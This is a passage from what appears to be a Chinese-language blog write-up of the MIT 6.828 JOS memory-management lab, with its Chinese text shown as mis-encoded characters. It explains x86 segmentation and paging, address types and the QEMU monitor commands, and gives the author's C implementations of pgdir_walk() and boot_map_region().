‡ä¸æ®µçš„æƒé™</p><p>å› æ­¤åœ¨è®¿é—®ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼ˆé€»è¾‘åœ°å€ï¼‰æ—¶é¦–å…ˆéœ€è¦é€šè¿‡æ®µæè¿°ç¬¦ç¿»è¯‘æˆå¯¹åº”çš„çº¿æ€§åœ°å€ï¼ˆè‹¥æœªå¼€å¯åˆ†é¡µåˆ™ç¿»è¯‘çš„ç»“æœä¾¿ç›´æ¥ä¸ºç‰©ç†åœ°å€ï¼‰</p><p><img src="https://s2.loli.net/2022/03/15/jhiSsfPoKgVyGdR.png" alt="image.png"></p><p>ä¸€ä¸ªæ®µæè¿°ç¬¦æœ‰ç€å¦‚ä¸‹ç»“æ„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>ç³»ç»Ÿæ®µ</strong>ä¸æ™®é€šçš„æ•°æ®æ®µå’Œä»£ç æ®µç­‰æ˜¯æœ‰äº›è®¸åŒºåˆ«çš„ï¼Œåè€…å°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æ™®é€šçš„æ®µï¼Œè€Œå‰è€…é€šå¸¸ç”¨äºè¡¨ç¤ºä¸­æ–­é—¨ã€é™·é˜±é—¨ã€è°ƒç”¨é—¨ç­‰</p><p><img src="https://s2.loli.net/2022/03/15/xhKpzoEHBXnVRk1.png" alt="image.png"></p><p>å½“ç„¶ï¼Œæ—¢ç„¶æ®µå¯„å­˜å™¨é‡Œå­˜æ”¾çš„å˜æˆäº†æ®µé€‰æ‹©å­ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªç„¶éœ€è¦ä¸€ä¸ªæ–°çš„ç»“æ„æ¥å¯¹åº”è¡¨ç¤ºæ®µæè¿°ç¬¦è¡¨çš„åœ°å€ï¼Œæ®µæè¿°ç¬¦è¡¨åˆ†ä¸ºä¸¤ç§â€”â€”å…¨å±€æ®µæè¿°ç¬¦è¡¨ä¸å±€éƒ¨æ®µæè¿°ç¬¦è¡¨ï¼Œå› è€Œé¡µå¼•å…¥äº†ä¸¤ä¸ªæ–°çš„å¯„å­˜å™¨â€”â€”GDTR ä¸ LDTR</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå…¨å±€æ®µæè¿°ç¬¦è¡¨çš„ç¬¬ä¸€ä¸ªæ®µæè¿°ç¬¦ä¸º<strong>ä¸å¯ç”¨çš„æ®µæè¿°ç¬¦</strong></p><p><img src="https://s2.loli.net/2022/03/15/izYW8Dp7feT1wNE.png" alt="image.png"></p><p>æœ€åæˆ‘ä»¬æ¥çœ‹æ®µå¯„å­˜å™¨ä¸­å­˜æ”¾çš„æ®µé€‰æ‹©å­ï¼Œç»“æ„è¾ƒä¸ºç®€å•ï¼Œä¸»è¦å°±æ˜¯å­˜æ”¾äº†å¯¹åº”çš„æ®µæè¿°ç¬¦åœ¨æ®µæè¿°ç¬¦è¡¨ä¸­çš„ä¸‹æ ‡ã€è®¿é—®æƒé™ã€å¯¹åº”ä½äºå…¨å±€&#x2F;å±€éƒ¨æ®µæè¿°ç¬¦è¡¨</p><p><img src="https://s2.loli.net/2022/03/15/74PQFlKoHqLbsyW.png" alt="image.png"></p><blockquote><p>å…³äºåˆ†æ®µæœºåˆ¶ï¼Œæ›´è¯¦ç»†æ·±å…¥çš„è¯´æ˜å‚è§ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89</a></p></blockquote><h4 id="Page-Translation"><a href="#Page-Translation" class="headerlink" title="Page Translation"></a>Page Translation</h4><p>è®²å®Œäº†åˆ†æ®µæœºåˆ¶ï¼Œæ¥ä¸‹æ¥åˆ°åˆ†é¡µæœºåˆ¶ï¼Œåˆ†é¡µæœºåˆ¶å°†ç‰©ç†å†…å­˜ä»¥ã€Œé¡µã€ä¸ºç²’åº¦è¿›è¡Œç®¡ç†ï¼Œé€šè¿‡ã€Œé¡µè¡¨ã€è¿™ä¸€æ•°æ®ç»“æ„å®Œæˆçº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„</p><p>åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ˜¯å¦å¼€å¯åˆ†é¡µæ˜¯é€šè¿‡ Cr0 å¯„å­˜å™¨çš„ PG ä½æ ‡è¯†çš„ï¼Œ<strong>ä½†æ˜¯åˆ†æ®µæ˜¯é»˜è®¤å¼€å¯çš„</strong>ï¼Œæ€ä¹ˆå¤„ç†åˆ†æ®µä¸åˆ†é¡µä¹‹é—´çš„å†²çªå‘¢ï¼Ÿç¬”è€…è®¤ä¸ºå¯ä»¥è¿™ä¹ˆç†è§£ï¼š<strong>åœ¨å¼€å¯åˆ†é¡µä¹‹å‰ï¼Œåˆ†æ®µæ˜¯ç›´æ¥å¯¹ç‰©ç†åœ°å€ç©ºé—´è¿›è¡Œåˆ†æ®µï¼›åœ¨å¼€å¯åˆ†é¡µä¹‹åï¼Œåˆ†æ®µæ˜¯å¯¹é¡µè¡¨æ˜ å°„åçš„çº¿æ€§åœ°å€ç©ºé—´è¿›è¡Œåˆ†æ®µ</strong>ï¼Œç›¸å½“äºæ˜¯åœ¨åˆ†æ®µä¸ç‰©ç†åœ°å€ä¹‹é—´æ’å…¥äº†ä¸€ä¸ªä¸­é—´å±‚</p><p>äºæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹ 32 ä½ä¸‹å¯ç”¨äºŒçº§é¡µè¡¨çš„åˆ†é¡µæœºåˆ¶ï¼Œåœ¨åˆ†é¡µæœºåˆ¶ä¸‹ä¸€ä¸ª 32 ä½çš„çº¿æ€§åœ°å€æœ‰ç€è¿™æ ·çš„ä¸‰æ®µå¼ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/03/15/3pScjrUCxOkwJA7.png" alt="image.png"></p><p>åœ¨ Cr3 å¯„å­˜å™¨ä¸­å­˜æ”¾ç€é¡µç›®å½•è¡¨çš„åœ°å€ï¼›MMUåœ¨å°†ä¸€ä¸ªçº¿æ€§åœ°å€ç¿»è¯‘æˆç‰©ç†åœ°å€æ—¶ï¼Œé¦–å…ˆé€šè¿‡ Cr3 å¯„å­˜å™¨è·å–åˆ°é¡µç›®å½•è¡¨åœ°å€ï¼Œé€šè¿‡çº¿æ€§åœ°å€çš„ DIR åŸŸæ‰¾åˆ°é¡µç›®å½•è¡¨å¯¹åº”ä¸‹æ ‡çš„é¡µç›®å½•è¡¨é¡¹ï¼ˆPage Directory Entryï¼‰ï¼Œé¡µç›®å½•è¡¨é¡¹ä¸­å­˜æ”¾ç€å¯¹åº”çš„é¡µè¡¨çš„åœ°å€ï¼Œå†é€šè¿‡çº¿æ€§åœ°å€çš„ PAGE åŸŸæ‰¾åˆ°é¡µè¡¨å¯¹åº”ä¸‹æ ‡çš„é¡µè¡¨é¡¹ï¼ˆPage Table Entryï¼‰ï¼Œé¡µè¡¨é¡¹ä¸­å­˜æ”¾ç€å¯¹åº”çš„ç‰©ç†é¡µåœ°å€ï¼Œæœ€åé€šè¿‡ OFFSET åŸŸï¼ˆå³é¡µå†…åç§»ï¼‰è®¿é—®åˆ°å¯¹åº”ç‰©ç†é¡µçš„å¯¹åº”æ•°æ®</p><p><img src="https://s2.loli.net/2022/03/15/bnYKURW1xPg7CHN.png" alt="image.png"></p><p>ä¸€ä¸ªé¡µï¼ˆç›®å½•ï¼‰è¡¨é¡¹æœ‰ç€å¦‚ä¸‹çš„ç»“æ„ï¼Œç”±äºé¡µç›®å½•è¡¨ã€é¡µè¡¨ã€ç‰©ç†é¡µéƒ½æ˜¯ä»¥é¡µä¸ºå•ä½å¯¹é½çš„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å­˜æ”¾ä»¥é¡µä¸ºå•ä½çš„åœ°å€å³å¯ï¼Œç©ºé—²ä¸‹æ¥çš„è¿™äº›ä½è¢«ç”¨ä»¥å­˜æ”¾é¡µè®¿é—®ã€è¯»å†™æƒé™ç­‰</p><p><img src="https://s2.loli.net/2022/03/15/begX4uJNymUs92a.png" alt="image.png"></p><h3 id="Virtual-Linear-and-Physical-Addresses"><a href="#Virtual-Linear-and-Physical-Addresses" class="headerlink" title="Virtual, Linear, and Physical Addresses"></a>Virtual, Linear, and Physical Addresses</h3><p>æˆ‘ä»¬ç°åœ¨æ­£å¼å¯¹ä¸€å †å„ç§åœ°å€åè¯ä¸‹å®šä¹‰ï¼š</p><ul><li>ã€Œè™šæ‹Ÿåœ°å€ã€ï¼šåŸºäºåˆ†æ®µæœºåˆ¶è¡¨ç¤ºçš„åœ°å€ï¼Œç”±ä¸€ä¸ªæ®µé€‰æ‹©å­ä¸æ®µå†…åç§»ç»„æˆ</li><li>ã€Œçº¿æ€§åœ°å€ã€ï¼šåŸºäºåˆ†é¡µæœºåˆ¶è¡¨ç¤ºçš„åœ°å€ï¼Œæ˜¯ç»è¿‡äº†åˆ†æ®µç¿»è¯‘åçš„ä¸€ä¸ªåœ°å€</li><li>ã€Œç‰©ç†åœ°å€ã€ï¼šRAM ä¸Šçš„çœŸå®åœ°å€</li></ul><p>å¾—åˆ°å¦‚ä¸‹è½¬æ¢å›¾ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">           Selector  +--------------+         +-----------+</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     | Segmentation |         |  Paging   |</span><br><span class="line">Software             |              |--------&gt;|           |----------&gt;  RAM</span><br><span class="line">            Offset   |  Mechanism   |         | Mechanism |</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     +--------------+         +-----------+</span><br><span class="line">            Virtual                   Linear                Physical</span><br></pre></td></tr></table></figure><p>å…¶å®åœ¨åˆ†é¡µæœºåˆ¶å‡ºç°ä¹‹åï¼Œåˆ†æ®µæœºåˆ¶å°±æ²¡æœ‰ä»€ä¹ˆå­˜åœ¨çš„æ„ä¹‰äº†ï¼Œå› æ­¤ä½ å¯ä»¥çœ‹åˆ°ç°ä»£æ“ä½œç³»ç»ŸåŸºæœ¬ä¸Šéƒ½å¾ˆå°‘æåˆ†æ®µçš„æ¦‚å¿µï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹è™šæ‹Ÿåœ°å€å°±ç›´æ¥æ˜¯çº¿æ€§åœ°å€ï¼ˆå½“ç„¶ï¼Œå…¶å®è¿˜æ˜¯æœ‰ä¸€äº›åœ°æ–¹ç”¨åˆ°åˆ†æ®µçš„æƒé™éªŒè¯ç­‰ç‰¹æ€§çš„ï¼‰</p><p>åŒæ ·åœ°ï¼Œä¸ºäº†ç®€åŒ–åœ°å€ç¿»è¯‘çš„æ“ä½œï¼Œåœ¨ <code>boot/boot.S</code> ä¸­ JOS <strong>åˆå§‹åŒ–äº†ä¸€ä¸ªæ‰€æœ‰çš„æ®µæè¿°ç¬¦éƒ½å¯¹åº”æ®µåŸºå€ 0ã€æ®µç•Œé™ 0xffffffff çš„å…¨å±€æ®µæè¿°ç¬¦è¡¨</strong>ï¼Œè¿™æ ·è™šæ‹Ÿåœ°å€å®é™…ä¸Šå°±ç›´æ¥æ˜¯çº¿æ€§åœ°å€äº†</p><p>ä¸‹é¢æ¥çœ‹ Exercise 3ï¼Œä¸»è¦è®©æˆ‘ä»¬ç†Ÿæ‚‰ Qemu æä¾›çš„ä¸€äº›æŸ¥çœ‹å†…å­˜çš„æŒ‡ä»¤</p><blockquote><p><strong>Exercise 3.</strong> While GDB can only access QEMUâ€™s memory by virtual address, itâ€™s often useful to be able to inspect physical memory while setting up virtual memory. Review the QEMU <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html#qemu">monitor commands</a> from the lab tools guide, especially the <code>xp</code> command, which lets you inspect physical memory. To access the QEMU monitor, press Ctrl-a c in the terminal (the same binding returns to the serial console).</p><p>Use the xp command in the QEMU monitor and the x command in GDB to inspect memory at corresponding physical and virtual addresses and make sure you see the same data.</p><p>Our patched version of QEMU provides an info pg command that may also prove useful: it shows a compact but detailed representation of the current page tables, including all mapped memory ranges, permissions, and flags. Stock QEMU also provides an info mem command that shows an overview of which ranges of virtual addresses are mapped and with what permissions.</p></blockquote><p>å…ˆæŒ‰ <code>Ctrl + A</code>ï¼Œç„¶åå†æŒ‰ <code>C</code>ï¼Œè¿›å…¥ Qemu çš„ monitor æ¨¡å¼ï¼Œä½¿ç”¨ <code>info pg</code> æŒ‡ä»¤æŸ¥çœ‹åˆ†é¡µæ˜ å°„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/03/15/FlrKz6RbmSIBQf4.png" alt="image.png"></p><p>ä½¿ç”¨ <code>xp</code> å‘½ä»¤æŸ¥çœ‹å¯¹åº”ç‰©ç†å†…å­˜ä¸Šæ•°æ®ä¸ä¸¤ä¸ªæ˜ å°„çš„è™šæ‹Ÿåœ°å€ä¸Šæ•°æ®ï¼Œå®Œå…¨ä¸€è‡´</p><p><img src="https://s2.loli.net/2022/03/15/hupwIHRkyqefoD3.png" alt="image.png"></p><p>æœ€åæ˜¯ <code>info mem</code> æŸ¥çœ‹åœ°å€ç©ºé—´æƒé™ï¼Œè™šæ‹Ÿåœ°å€ç©ºé—´èµ·å§‹ 4MB ä»…ä¸ºå¯è¯»æƒé™ï¼Œä½äºè™šæ‹Ÿåœ°å€é«˜ 256MB çš„èµ·å§‹ 4MB ä¸ºå¯è¯»å†™æƒé™ï¼Œ<strong>ä½†å®é™…ä¸Šå¯¹åº”çš„éƒ½æ˜¯åŒä¸€å—ç‰©ç†åœ°å€ç©ºé—´</strong></p><p><img src="https://s2.loli.net/2022/03/15/N8nMTkh6Pgqlj5m.png" alt="image.png"></p><p>ç»§ç»­å¾€ä¸‹ï¼Œåœ¨ JOS ä¸­å®šä¹‰äº†ä¸¤ä¸ª <code>uint32_t</code> çš„åˆ«å <code>uintptr_t</code> ä¸ <code>physaddr_t</code> è¡¨ç¤ºè™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ï¼ˆåœ¨ç¼–è¯‘å™¨çœ‹æ¥å…¶å®æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼‰</p><table><thead><tr><th>C type</th><th>Address type</th></tr></thead><tbody><tr><td><code>T*</code></td><td>Virtual</td></tr><tr><td><code>uintptr_t</code></td><td>Virtual</td></tr><tr><td><code>physaddr_t</code></td><td>Physical</td></tr></tbody></table><p>æ¥ä¸‹æ¥æ˜¯ MIT 6.828 çš„ä¸€ä¸ªå°ä¹ é¢˜ï¼š</p><blockquote><p><strong>Question</strong></p><ol><li>Assuming that the following JOS kernel code is correct, what type should variable <code>x</code> have, <code>uintptr_t</code> or <code>physaddr_t</code>?</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mystery_t x;</span><br><span class="line">char* value = return_a_pointer();</span><br><span class="line">*value = 10;</span><br><span class="line">x = (mystery_t) value;</span><br></pre></td></tr></table></figure></blockquote><p>æˆ‘ä»¬çŸ¥é“è™šæ‹Ÿåœ°å€æ˜¯å¯ä»¥é€šè¿‡ MMU è¿›è¡Œç¿»è¯‘è®¿é—®åˆ°ç‰©ç†åœ°å€çš„ï¼Œä½†æ˜¯ä¸€ä¸ªç‰©ç†åœ°å€ç»è¿‡ MMU ä¹‹åå¾—åˆ°çš„å¯èƒ½æ˜¯å¥‡å½¢æ€ªçŠ¶çš„ä¸œè¥¿ï¼ˆæ¯”å¦‚è¯´ç‰©ç†åœ°å€åŒå€¼çš„è™šæ‹Ÿåœ°å€å·²ç»å»ºç«‹äº†ä¸€ä¸ªæ˜ å°„ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œçš„ x åº”å½“æ˜¯ <code>uintptr_t</code> ç±»å‹</p><h3 id="Reference-counting"><a href="#Reference-counting" class="headerlink" title="Reference counting"></a>Reference counting</h3><p>åœ¨ç”¨ä»¥è¡¨ç¤ºå•ä¸ªç‰©ç†é¡µæ¡†çš„ <code>PageInfo</code> ç»“æ„ä½“ä¸­çš„æˆå‘˜ <code>pp_ref</code> ç”¨ä»¥è¡¨ç¤ºä¸€å¼ é¡µé¢è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼ˆå¼•ç”¨è®¡æ•°ï¼‰ï¼Œå¼•ç”¨è®¡æ•°ä¸º 0 æ—¶è¡¨ç¤ºè¯¥é¡µä¸ºç©ºé—²é¡µï¼Œä½†æ˜¯å¼•ç”¨è®¡æ•°çš„å¢&#x2F;å‡<strong>åº”å½“ç”±ä½¿ç”¨è€…å®Œæˆ</strong>ï¼Œå› æ­¤åœ¨æˆ‘ä»¬è°ƒç”¨ <code>page_alloc()</code> ä¹‹ååº”å½“ç«‹å³å°†å¼•ç”¨è®¡æ•° + 1ï¼Œè€Œå½“å¼•ç”¨è®¡æ•°ä¸º 0 æ—¶æˆ‘ä»¬æ‰åº”å½“è°ƒç”¨ <code>page_free()</code> é‡Šæ”¾ä¸€å¼ å†…å­˜é¡µ</p><blockquote><p>æœ€åè¿™ä¸ªå·¥ä½œ JOS å½’å¹¶åœ¨ <code>page_decref()</code> ä¸­å®Œæˆ</p></blockquote><h3 id="Page-Table-Management"><a href="#Page-Table-Management" class="headerlink" title="Page Table Management"></a>Page Table Management</h3><p>æ¥ä¸‹æ¥æ˜¯ Exercise4ï¼Œè®©æˆ‘ä»¬å®Œæˆå¯¹é¡µè¡¨çš„ç®¡ç†ï¼Œè¡¥å…¨å¯¹åº”å‡½æ•°</p><blockquote><p><strong>Exercise 4.</strong> In the file <code>kern/pmap.c</code>, you must implement code for the following functions.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pgdir_walk()</span><br><span class="line">boot_map_region()</span><br><span class="line">page_lookup()</span><br><span class="line">page_remove()</span><br><span class="line">page_insert()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>check_page()</code>, called from <code>mem_init()</code>, tests your page table management routines. You should make sure it reports success before proceeding.</p></blockquote><h4 id="pgdir-walk-ï¼šï¼ˆåˆ›å»ºå¹¶ï¼‰è¿”å›-PTE"><a href="#pgdir-walk-ï¼šï¼ˆåˆ›å»ºå¹¶ï¼‰è¿”å›-PTE" class="headerlink" title="pgdir_walk()ï¼šï¼ˆåˆ›å»ºå¹¶ï¼‰è¿”å› PTE"></a>pgdir_walk()ï¼šï¼ˆåˆ›å»ºå¹¶ï¼‰è¿”å› PTE</h4><p>æŒ‰æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œå¯¹äºä¸€ä¸ªç»™å®šçš„é¡µç›®å½•è¡¨åœ°å€ä¸ä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œè¯¥å‡½æ•°åº”å½“è¿”å›å¯¹åº”çš„ã€Œé¡µè¡¨é¡¹ã€çš„åœ°å€ï¼Œè‹¥å¯¹åº”çš„é¡µè¡¨ä¸ºç©ºä¸”æŒ‡å®šäº† <code>create</code> æ ‡å¿—ä½ï¼Œåˆ™åˆ†é…ä¸€å¼ æ–°çš„ç‰©ç†é¡µä½œä¸ºæ–°çš„é¡µè¡¨ï¼Œè‹¥å¦ã€æˆ–æ˜¯åˆ†é…ç‰©ç†é¡µå¤±è´¥åˆ™ç›´æ¥è¿”å› NULLï¼›åˆ†é…æˆåŠŸååº”å½“å¢åŠ è¯¥é¡µçš„å¼•ç”¨è®¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Given &#x27;pgdir&#x27;, a pointer to a page directory, pgdir_walk returns</span></span><br><span class="line"><span class="comment">// a pointer to the page table entry (PTE) for linear address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// This requires walking the two-level page table structure.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The relevant page table page might not exist yet.</span></span><br><span class="line"><span class="comment">// If this is true, and create == false, then pgdir_walk returns NULL.</span></span><br><span class="line"><span class="comment">// Otherwise, pgdir_walk allocates a new page table page with page_alloc.</span></span><br><span class="line"><span class="comment">//    - If the allocation fails, pgdir_walk returns NULL.</span></span><br><span class="line"><span class="comment">//    - Otherwise, the new page&#x27;s reference count is incremented,</span></span><br><span class="line"><span class="comment">//the page is cleared,</span></span><br><span class="line"><span class="comment">//and pgdir_walk returns a pointer into the new page table page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint 1: you can turn a PageInfo * into the physical address of the</span></span><br><span class="line"><span class="comment">// page it refers to with page2pa() from kern/pmap.h.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint 2: the x86 MMU checks permission bits in both the page directory</span></span><br><span class="line"><span class="comment">// and the page table, so it&#x27;s safe to leave permissions in the page</span></span><br><span class="line"><span class="comment">// directory more permissive than strictly necessary.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint 3: look at inc/mmu.h for useful macros that manipulate page</span></span><br><span class="line"><span class="comment">// table and page directory entries.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>å‚ç…§æºç å…¶ä»–åœ°æ–¹çš„ç›¸å…³å†™æ³•ï¼Œåˆ©ç”¨ JOS æä¾›çš„ä¸€äº›å®å¾ˆå®¹æ˜“å°±èƒ½è¡¥å®Œè¯¥å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pte_t</span> *</span><br><span class="line"><span class="title function_">pgdir_walk</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">const</span> <span class="type">void</span> *va, <span class="type">int</span> create)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pde_idx;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">new_page_table_page</span>;</span></span><br><span class="line"><span class="type">pte_t</span> *page_table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pgdir)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create page table if not exist</span></span><br><span class="line">pde_idx = PDX(va);</span><br><span class="line"><span class="keyword">if</span> (!pgdir[pde_idx] || !(pgdir[pde_idx] &amp; PTE_P))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (create)</span><br><span class="line">&#123;</span><br><span class="line">new_page_table_page = page_alloc(ALLOC_ZERO);</span><br><span class="line"><span class="keyword">if</span> (!new_page_table_page)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">new_page_table_page-&gt;pp_ref++;</span><br><span class="line">pgdir[pde_idx] = (<span class="type">pde_t</span>) (page2pa(new_page_table_page) | PTE_P | PTE_W | PTE_U);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// align to PGSIZE</span></span><br><span class="line">page_table = (<span class="type">pte_t</span>*) ((<span class="type">uint32_t</span>) KADDR(pgdir[pde_idx]) &amp; (~(PGSIZE - <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;page_table[PTX(va)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="boot-map-region-ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åŒºåŸŸåˆ°ç‰©ç†åœ°å€åŒºåŸŸæ˜ å°„"><a href="#boot-map-region-ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åŒºåŸŸåˆ°ç‰©ç†åœ°å€åŒºåŸŸæ˜ å°„" class="headerlink" title="boot_map_region()ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åŒºåŸŸåˆ°ç‰©ç†åœ°å€åŒºåŸŸæ˜ å°„"></a>boot_map_region()ï¼šå»ºç«‹è™šæ‹Ÿåœ°å€åŒºåŸŸåˆ°ç‰©ç†åœ°å€åŒºåŸŸæ˜ å°„</h4><p>æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œä¸»è¦æ˜¯å»ºç«‹è™šæ‹Ÿåœ°å€ <code>[va, va+size)</code> åˆ°ç‰©ç†åœ°å€ <code>[pa, pa+size)</code> ä¹‹é—´çš„æ˜ å°„ï¼Œæç¤ºæˆ‘ä»¬ä½¿ç”¨ <code>pgdir_walk()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Map [va, va+size) of virtual address space to physical [pa, pa+size)</span></span><br><span class="line"><span class="comment">// in the page table rooted at pgdir.  Size is a multiple of PGSIZE, and</span></span><br><span class="line"><span class="comment">// va and pa are both page-aligned.</span></span><br><span class="line"><span class="comment">// Use permission bits perm|PTE_P for the entries.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function is only intended to set up the ``static&#x27;&#x27; mappings</span></span><br><span class="line"><span class="comment">// above UTOP. As such, it should *not* change the pp_ref field on the</span></span><br><span class="line"><span class="comment">// mapped pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: the TA solution uses pgdir_walk</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”å†™å…¥é¡µè¡¨é¡¹æ¡ç›®å³å¯ï¼Œæ³¨æ„è¿™é‡Œä¸éœ€è¦æ”¹å˜é¡µçš„å¼•ç”¨è®¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">boot_map_region</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">uintptr_t</span> va, <span class="type">size_t</span> size, <span class="type">physaddr_t</span> pa, <span class="type">int</span> perm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">pte_t</span> *cur_pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size / PGSIZE; i++)</span><br><span class="line">&#123;</span><br><span class="line">cur_pte = pgdir_walk(pgdir, (<span class="type">void</span> *)(va + i * PGSIZE), <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!cur_pte)</span><br><span class="line">panic(<span class="string">&quot;out of memory while creating page table!&quot;</span>);</span><br><span class="line">*cur_pte = (<span class="type">pte_t</span>) ((pa + i * PGSIZE) | PTE_P | perm);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-lookup-ï¼šè¿”å›è™šæ‹Ÿåœ°å€å¯¹åº”-PageInfo-åœ°å€"><a 